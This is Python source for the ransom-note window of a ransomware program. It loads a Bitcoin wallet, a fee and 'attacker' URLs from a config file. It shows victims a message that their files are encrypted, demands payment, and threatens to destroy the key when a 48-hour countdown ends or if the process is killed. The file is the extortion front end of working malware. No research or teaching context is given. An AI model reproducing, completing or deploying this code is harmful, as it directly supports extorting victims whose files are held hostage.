#! /usr/bin/env python
#  -*- coding: utf-8 -*-

try:
    import Tkinter as tk
except ImportError:
    import tkinter as tk

try:
    import ttk
    py3 = False
except ImportError:
    import tkinter.ttk as ttk
    py3 = True

try:
    import check_log_gui #Importing GUI to Show Data of log.txt in GUI Window
    import decryptor_gui #Importing GUI to Facilitiate decryption process
except ImportError: 
    from after_stage2 import check_log_gui #Importing GUI to Show Data of log.txt in GUI Window
    from after_stage2 import decryptor_gui #Importing GUI to Facilitiate decryption process    
   
from PIL import Image, ImageTk
import os.path

#Modules Used to Update Timer in GUI
import time
import datetime

#Module Used in Opening Site in Browser, MultiThreading etc.
import sys, webbrowser, threading

import configparser   #Module to Read config.txt
 

def start_gui(machine_id):
    '''Starting point when module is the main routine.'''
    global root
    global prog_location
    prog_call = sys.argv[0]
    prog_location = os.path.split(prog_call)[0]
    root = tk.Tk()  
    top = Toplevel1(root, machine_id)
    t1 = threading.Thread(target=top.count_down)
    t1.start()
    root.mainloop()

class Toplevel1:
    def __init__(self, top=None, machine_id="TEST MACHINE ID"):
        '''This class configures and populates the toplevel window.
           top is the toplevel containing window.'''
           
        config = configparser.RawConfigParser()
        config.read('config.txt')
        
        self.machine_id = machine_id
        self.ransomeware_title = config.get('GUI_SETTINGS', 'ransomeware_title') #Retriving From config.txt
        self.wallet_addr = config.get('GUI_SETTINGS', 'wallet_addr') #Retriving From config.txt
        self.btc_fee = config.get('GUI_SETTINGS', 'btc_fee') #Retriving From config.txt
        self.retrive_key_url = config.get('GUI_SETTINGS', 'retrive_key_url') #Retriving From config.txt
        self.about_us_url = config.get('GUI_SETTINGS', 'about_us_url') #Retriving From config.txt

           
        _bgcolor = '#d9d9d9'  # X11 color: 'gray85'
        _fgcolor = '#000000'  # X11 color: 'black'
        _compcolor = '#d9d9d9' # X11 color: 'gray85'
        _ana1color = '#d9d9d9' # X11 color: 'gray85'
        _ana2color = '#ececec' # Closest X11 color: 'gray92'
        font11 = "-family {Segoe UI} -size 11 -weight bold -slant "  \
            "roman -underline 0 -overstrike 0"
        self.style = ttk.Style()
        if sys.platform == "win32":
            self.style.theme_use('winnative')
        self.style.configure('.',background=_bgcolor)
        self.style.configure('.',foreground=_fgcolor)
        self.style.configure('.',font="TkDefaultFont")
        self.style.map('.',background=
            [('selected', _compcolor), ('active',_ana2color)])

        top.geometry("722x503+317+116")
        top.minsize(124, 1)
        top.maxsize(1362, 741)
        top.resizable(0, 0)
        top.title(self.ransomeware_title)
        icon_location = ImageTk.PhotoImage(file=os.path.join(prog_location,"img/lock.ico"))
        top.tk.call('wm', 'iconphoto', top._w, icon_location)
        top.configure(background="#ff0000")
        top.configure(highlightbackground="#d9d9d9")
        top.configure(highlightcolor="black")

        self.Label1 = tk.Label(top)
        self.Label1.place(relx=0.014, rely=0.02, height=201, width=164)
        self.Label1.configure(activebackground="#f9f9f9")
        self.Label1.configure(activeforeground="black")
        self.Label1.configure(background="#ff0000")
        self.Label1.configure(disabledforeground="#a3a3a3")
        self.Label1.configure(foreground="#000000")
        self.Label1.configure(highlightbackground="#d9d9d9")
        self.Label1.configure(highlightcolor="black")
        photo_location = os.path.join(prog_location,"img/lock1.PNG")
        global _img0
        _img0 = ImageTk.PhotoImage(file=photo_location)
        self.Label1.configure(image=_img0)
        self.Label1.configure(text='''Label''')

        self.TLabel1 = ttk.Label(top)
        self.TLabel1.place(relx=0.259, rely=0.01, height=39, width=406)
        self.TLabel1.configure(background="#ff0000")
        self.TLabel1.configure(foreground="#ffff00")
        self.TLabel1.configure(font="-family {Segoe UI} -size 16 -weight bold")
        self.TLabel1.configure(relief="flat")
        self.TLabel1.configure(text='''Oops Your Files Have Been Encrypted!''')

        self.Scrolledtext1 = ScrolledText(top)
        self.Scrolledtext1.place(relx=0.26, rely=0.093, relheight=0.638
                , relwidth=0.722)
        self.Scrolledtext1.configure(background="white")
        self.Scrolledtext1.configure(font="-family {Segoe UI} -size 10 -weight bold")
        self.Scrolledtext1.configure(foreground="black")
        self.Scrolledtext1.configure(highlightbackground="#d9d9d9")
        self.Scrolledtext1.configure(highlightcolor="black")
        self.Scrolledtext1.configure(insertbackground="black")
        self.Scrolledtext1.configure(insertborderwidth="3")
        self.Scrolledtext1.configure(selectbackground="#c4c4c4")
        self.Scrolledtext1.configure(selectforeground="black")
        self.Scrolledtext1.configure(wrap="none")
        
        self.message = '''        
What Happened to Your Computer?
_____________________________________________
        
Your important files are encrypted with Military Grade AES-256 bit Encryption.
        
All your documents, photos, videos & other files are now inaccessible, & 
cannot be unlocked  without the decryption key. This key is currently 
being stored on a remote server.
        
Don't waste your Time in looking for ways to decrypt your files. Files can only
be decrypted via our decryptor with valid decryption key.
        
        
How Can You Recover Your Files?
_________________________________________
        
Simply Acquire Decryption key by paying given amount of Bitcoin & paste key
in decryptor to make your files accessible.
        
        
        
What Happen If You Don't Pay?
___________________________________________
        
If you fail to take action within this time as shown in this window, the 
decryption key will be destroyed and access to your files will be
permanently lost.


COPY YOUR MACHINE ID Carefully, Without Any Spaces.
________________________________________________________________________________________
        
[+]  YOUR MACHINE ID :  '''+ self.machine_id +'''
________________________________________________________________________________________
                
________________________________________________________________________________________
        
[+]  WALLET ADDRESS  :  '''+ self.wallet_addr +'''
________________________________________________________________________________________
                
__________________________________________
[$$]  BITCOIN FEE     :     '''+self.btc_fee+'''
__________________________________________
        
        
                        DON'T DARE TO KILL ME, 
    OTHERWISE KEY WILL AUTOMATICALLY GET DESTROYED!


        '''
        self.Scrolledtext1.insert(tk.INSERT, self.message)
        self.Scrolledtext1.configure(state='disabled')
        
        self.Langauge = tk.StringVar()
        self.value_list = ['English', 'Hindi', 'Urdu', 'Russian']
        self.TCombobox1 = ttk.Combobox(top, values=self.value_list)
        self.TCombobox1.place(relx=0.796, rely=0.032, relheight=0.042
                , relwidth=0.184)
        self.TCombobox1.current(0)        
        self.TCombobox1.configure(textvariable=self.Langauge)
        self.TCombobox1.configure(takefocus="")
        self.TCombobox1.configure(state='readonly')
        self.TCombobox1.configure(background="white")
        self.TCombobox1.bind('<<ComboBoxSelected>>', self.change_language)


        self.Labelframe1 = tk.LabelFrame(top)
        self.Labelframe1.place(relx=0.259, rely=0.755, relheight=0.129
                , relwidth=0.72)
        self.Labelframe1.configure(relief='groove')
        self.Labelframe1.configure(foreground="black")
        self.Labelframe1.configure(background="#ff0000")
        self.Labelframe1.configure(highlightbackground="#d9d9d9")
        self.Labelframe1.configure(highlightcolor="black")

        self.TLabel2 = ttk.Label(self.Labelframe1)
        self.TLabel2.place(relx=0.015, rely=0.077, height=29, width=146
                , bordermode='ignore')
        self.TLabel2.configure(background="#ff0000")
        self.TLabel2.configure(foreground="#ffff00")
        self.TLabel2.configure(font="-family {Segoe UI} -size 11 -weight bold")
        self.TLabel2.configure(relief="flat")
        self.TLabel2.configure(text='''WALLET ADDRESS :''')

        self.TLabel3 = ttk.Label(self.Labelframe1)
        self.TLabel3.place(relx=0.017, rely=0.462, height=29, width=186
                , bordermode='ignore')
        self.TLabel3.configure(background="#ff0000")
        self.TLabel3.configure(foreground="#ffff00")
        self.TLabel3.configure(font="-family {Segoe UI} -size 12 -weight bold")
        self.TLabel3.configure(relief="flat")
        self.TLabel3.configure(text='''BITCOIN FEE  TO PAY :''')

        self.Label7 = tk.Label(self.Labelframe1)
        self.Label7.place(relx=0.312, rely=0.123, height=21, width=354
                , bordermode='ignore')
        self.Label7.configure(background="#ff0000")
        self.Label7.configure(disabledforeground="#a3a3a3")
        self.Label7.configure(font=font11)
        self.Label7.configure(foreground="#ffff00")
        self.Label7.configure(text=self.wallet_addr) #BITCOIN WALLET ADDRESS 

        self.Label8 = tk.Label(self.Labelframe1)
        self.Label8.place(relx=0.538, rely=0.523, height=21, width=224
                , bordermode='ignore')
        self.Label8.configure(background="#ff0000")
        self.Label8.configure(disabledforeground="#a3a3a3")
        self.Label8.configure(font=font11)
        self.Label8.configure(foreground="#ffff00")
        self.Label8.configure(text=self.btc_fee)

        self.Button1 = tk.Button(top, command=check_log_gui.start_gui)
        self.Button1.place(relx=0.26, rely=0.911, height=34, width=257)
        self.Button1.configure(activebackground="#ececec")
        self.Button1.configure(activeforeground="#000000")
        self.Button1.configure(background="#d9d9d9")
        self.Button1.configure(disabledforeground="#a3a3a3")
        self.Button1.configure(font="-family {Segoe UI} -size 10 -weight bold")
        self.Button1.configure(foreground="#000000")
        self.Button1.configure(highlightbackground="#d9d9d9")
        self.Button1.configure(highlightcolor="black")
        self.Button1.configure(pady="0")
        self.Button1.configure(text='''Check Encrypted Files Log''')

        self.Button2 = tk.Button(top, command=decryptor_gui.start_gui)
        self.Button2.place(relx=0.637, rely=0.911, height=34, width=247)
        self.Button2.configure(activebackground="#ececec")
        self.Button2.configure(activeforeground="#000000")
        self.Button2.configure(background="#d9d9d9")
        self.Button2.configure(disabledforeground="#a3a3a3")
        self.Button2.configure(font="-family {Segoe UI} -size 10 -weight bold")
        self.Button2.configure(foreground="#000000")
        self.Button2.configure(highlightbackground="#d9d9d9")
        self.Button2.configure(highlightcolor="black")
        self.Button2.configure(pady="0")
        self.Button2.configure(text='''Enter Decryption Key''')

        self.Labelframe2 = tk.LabelFrame(top)
        self.Labelframe2.place(relx=0.021, rely=0.437, relheight=0.169
                , relwidth=0.222)
        self.Labelframe2.configure(relief='groove')
        self.Labelframe2.configure(font="-family {Segoe UI} -size 12 -weight bold")
        self.Labelframe2.configure(foreground="black")
        self.Labelframe2.configure(background="#ff0000")
        self.Labelframe2.configure(highlightbackground="#d9d9d9")
        self.Labelframe2.configure(highlightcolor="black")

        self.Label2 = tk.Label(self.Labelframe2)
        self.Label2.place(relx=0.044, rely=0.024, height=31, width=144
                , bordermode='ignore')
        self.Label2.configure(activebackground="#f9f9f9")
        self.Label2.configure(activeforeground="black")
        self.Label2.configure(background="#ff0000")
        self.Label2.configure(disabledforeground="#a3a3a3")
        self.Label2.configure(font="-family {Segoe UI} -size 12 -weight bold")
        self.Label2.configure(foreground="#ffff00")
        self.Label2.configure(highlightbackground="#d9d9d9")
        self.Label2.configure(highlightcolor="black")
        self.Label2.configure(text='''TIME REMAINING''')

        self.Labelframe3 = tk.LabelFrame(self.Labelframe2)
        self.Labelframe3.place(relx=0.031, rely=0.365, relheight=0.529
                , relwidth=0.938, bordermode='ignore')
        self.Labelframe3.configure(relief='groove')
        self.Labelframe3.configure(foreground="black")
        self.Labelframe3.configure(background="#ff0000")
        self.Labelframe3.configure(highlightbackground="#d9d9d9")
        self.Labelframe3.configure(highlightcolor="black")

        self.time_str = tk.StringVar()
        self.Label3 = tk.Label(self.Labelframe3)
        self.Label3.place(relx=0.053, rely=0.133, height=31, width=134
                , bordermode='ignore')
        self.Label3.configure(activebackground="#f9f9f9")
        self.Label3.configure(activeforeground="black")
        self.Label3.configure(background="#ff0000")
        self.Label3.configure(disabledforeground="#a3a3a3")
        self.Label3.configure(font="-family {Segoe UI} -size 22 -weight bold")
        self.Label3.configure(foreground="#ffff00")
        self.Label3.configure(highlightbackground="#d9d9d9")
        self.Label3.configure(highlightcolor="black")
        self.Label3.configure(text='''00:00:00''')
        self.Label3.configure(textvariable=self.time_str)


        self.Button3 = tk.Button(top, command=self.retrive_key)
        self.Button3.place(relx=0.021, rely=0.636, height=24, width=157)
        self.Button3.configure(activebackground="#ececec")
        self.Button3.configure(activeforeground="#000000")
        self.Button3.configure(background="#d9d9d9")
        self.Button3.configure(disabledforeground="#a3a3a3")
        self.Button3.configure(font="-family {Segoe UI} -size 9 -weight bold")
        self.Button3.configure(foreground="#000000")
        self.Button3.configure(highlightbackground="#d9d9d9")
        self.Button3.configure(highlightcolor="black")
        self.Button3.configure(pady="0")
        self.Button3.configure(text='''Retrive Key''')

        self.Button4 = tk.Button(top, command=self.about_us)
        self.Button4.place(relx=0.021, rely=0.696, height=24, width=157)
        self.Button4.configure(activebackground="#ececec")
        self.Button4.configure(activeforeground="#000000")
        self.Button4.configure(background="#d9d9d9")
        self.Button4.configure(disabledforeground="#a3a3a3")
        self.Button4.configure(font="-family {Segoe UI} -size 9 -weight bold")
        self.Button4.configure(foreground="#000000")
        self.Button4.configure(highlightbackground="#d9d9d9")
        self.Button4.configure(highlightcolor="black")
        self.Button4.configure(pady="0")
        self.Button4.configure(text='''About US''')

        self.Label4 = tk.Label(top)
        self.Label4.place(relx=0.024, rely=0.759, height=61, width=154)
        self.Label4.configure(activebackground="#f9f9f9")
        self.Label4.configure(activeforeground="black")
        self.Label4.configure(background="#ff0000")
        self.Label4.configure(disabledforeground="#a3a3a3")
        self.Label4.configure(foreground="#000000")
        self.Label4.configure(highlightbackground="#d9d9d9")
        self.Label4.configure(highlightcolor="black")
        photo_location = os.path.join(prog_location,"img/bitcoin1.png")
        global _img1
        _img1 = tk.PhotoImage(file=photo_location)
        self.Label4.configure(image=_img1)
        self.Label4.configure(text='''Bitcoin Image''')

        self.Label5 = tk.Label(top)
        self.Label5.place(relx=0.014, rely=0.887, height=21, width=164)
        self.Label5.configure(activebackground="#f9f9f9")
        self.Label5.configure(activeforeground="black")
        self.Label5.configure(background="#ff0000")
        self.Label5.configure(disabledforeground="#a3a3a3")
        self.Label5.configure(font="-family {Segoe UI} -size 11 -weight bold")
        self.Label5.configure(foreground="#ffff00")
        self.Label5.configure(highlightbackground="#d9d9d9")
        self.Label5.configure(highlightcolor="black")
        self.Label5.configure(text='''KEY WILL BE DELETED''')

        self.Label6 = tk.Label(top)
        self.Label6.place(relx=0.014, rely=0.934, height=21, width=164)
        self.Label6.configure(activebackground="#f9f9f9")
        self.Label6.configure(activeforeground="black")
        self.Label6.configure(background="#ff0000")
        self.Label6.configure(disabledforeground="#a3a3a3")
        self.Label6.configure(font="-family {Segoe UI} -size 11 -weight bold")
        self.Label6.configure(foreground="#ffff00")
        self.Label6.configure(highlightbackground="#d9d9d9")
        self.Label6.configure(highlightcolor="black")
        self.Label6.configure(text='''!!! AFTER 48 HOURS  !!!''')             

    def retrive_key(self):
        attacker_url = self.retrive_key_url
        webbrowser.open_new(attacker_url)
        
    def about_us(self):
        attacker_url = self.about_us_url
        webbrowser.open_new(attacker_url)      

    def count_down(self):
        for t in range(36000, -1, -1):
            sf = str(datetime.timedelta(seconds=t))
            self.time_str.set(sf)
            root.update()
            time.sleep(1) 

    def change_language(self, event=None):
        selected_language = self.Langauge.get()
        if selected_language != None or selected_language != '':
            if selected_language == 'Hindi':
                self.Scrolledtext1.configure(state='normal')
                self.Scrolledtext1.insert(tk.INSERT, "Changed to Hindi")
                self.Scrolledtext1.configure(state='disabled')
            elif selected_language == 'Urdu':
                self.Scrolledtext1.configure(state='normal')
                self.Scrolledtext1.insert(tk.INSERT, "Changed to Urdu")
                self.Scrolledtext1.configure(state='disabled')
            elif selected_language == 'English':
                self.Scrolledtext1.configure(state='normal')
                self.Scrolledtext1.insert(tk.INSERT, self.message) 
                self.Scrolledtext1.configure(state='disabled')

# The following code is added to facilitate the Scrolled widgets you specified.
class AutoScroll(object):
    '''Configure the scrollbars for a widget.'''

    def __init__(self, master):
        #  Rozen. Added the try-except clauses so that this class
        #  could be used for scrolled entry widget for which vertical
        #  scrolling is not supported. 5/7/14.
        try:
            vsb = ttk.Scrollbar(master, orient='vertical', command=self.yview)
        except:
            pass
        hsb = ttk.Scrollbar(master, orient='horizontal', command=self.xview)

        #self.configure(yscrollcommand=_autoscroll(vsb),
        #    xscrollcommand=_autoscroll(hsb))
        try:
            self.configure(yscrollcommand=self._autoscroll(vsb))
        except:
            pass
        self.configure(xscrollcommand=self._autoscroll(hsb))

        self.grid(column=0, row=0, sticky='nsew')
        try:
            vsb.grid(column=1, row=0, sticky='ns')
        except:
            pass
        hsb.grid(column=0, row=1, sticky='ew')

        master.grid_columnconfigure(0, weight=1)
        master.grid_rowconfigure(0, weight=1)

        # Copy geometry methods of master  (taken from ScrolledText.py)
        if py3:
            methods = tk.Pack.__dict__.keys() | tk.Grid.__dict__.keys() \
                  | tk.Place.__dict__.keys()
        else:
            methods = tk.Pack.__dict__.keys() + tk.Grid.__dict__.keys() \
                  + tk.Place.__dict__.keys()

        for meth in methods:
            if meth[0] != '_' and meth not in ('config', 'configure'):
                setattr(self, meth, getattr(master, meth))

    @staticmethod
    def _autoscroll(sbar):
        '''Hide and show scrollbar as needed.'''
        def wrapped(first, last):
            first, last = float(first), float(last)
            if first <= 0 and last >= 1:
                sbar.grid_remove()
            else:
                sbar.grid()
            sbar.set(first, last)
        return wrapped

    def __str__(self):
        return str(self.master)

def _create_container(func):
    '''Creates a ttk Frame with a given master, and use this new frame to
    place the scrollbars and the widget.'''
    def wrapped(cls, master, **kw):
        container = ttk.Frame(master)
        container.bind('<Enter>', lambda e: _bound_to_mousewheel(e, container))
        container.bind('<Leave>', lambda e: _unbound_to_mousewheel(e, container))
        return func(cls, container, **kw)
    return wrapped

class ScrolledText(AutoScroll, tk.Text):
    '''A standard Tkinter Text widget with scrollbars that will
    automatically show/hide as needed.'''
    @_create_container
    def __init__(self, master, **kw):
        tk.Text.__init__(self, master, **kw)
        AutoScroll.__init__(self, master)

import platform
def _bound_to_mousewheel(event, widget):
    child = widget.winfo_children()[0]
    if platform.system() == 'Windows' or platform.system() == 'Darwin':
        child.bind_all('<MouseWheel>', lambda e: _on_mousewheel(e, child))
        child.bind_all('<Shift-MouseWheel>', lambda e: _on_shiftmouse(e, child))
    else:
        child.bind_all('<Button-4>', lambda e: _on_mousewheel(e, child))
        child.bind_all('<Button-5>', lambda e: _on_mousewheel(e, child))
        child.bind_all('<Shift-Button-4>', lambda e: _on_shiftmouse(e, child))
        child.bind_all('<Shift-Button-5>', lambda e: _on_shiftmouse(e, child))

def _unbound_to_mousewheel(event, widget):
    if platform.system() == 'Windows' or platform.system() == 'Darwin':
        widget.unbind_all('<MouseWheel>')
        widget.unbind_all('<Shift-MouseWheel>')
    else:
        widget.unbind_all('<Button-4>')
        widget.unbind_all('<Button-5>')
        widget.unbind_all('<Shift-Button-4>')
        widget.unbind_all('<Shift-Button-5>')

def _on_mousewheel(event, widget):
    if platform.system() == 'Windows':
        widget.yview_scroll(-1*int(event.delta/120),'units')
    elif platform.system() == 'Darwin':
        widget.yview_scroll(-1*int(event.delta),'units')
    else:
        if event.num == 4:
            widget.yview_scroll(-1, 'units')
        elif event.num == 5:
            widget.yview_scroll(1, 'units')

def _on_shiftmouse(event, widget):
    if platform.system() == 'Windows':
        widget.xview_scroll(-1*int(event.delta/120), 'units')
    elif platform.system() == 'Darwin':
        widget.xview_scroll(-1*int(event.delta), 'units')
    else:
        if event.num == 4:
            widget.xview_scroll(-1, 'units')
        elif event.num == 5:
            widget.xview_scroll(1, 'units')

if __name__ == '__main__':
    start_gui("555f9f3b573f4c41e7de2c5b3f97ed54")  #Takes Machine ID As Argument





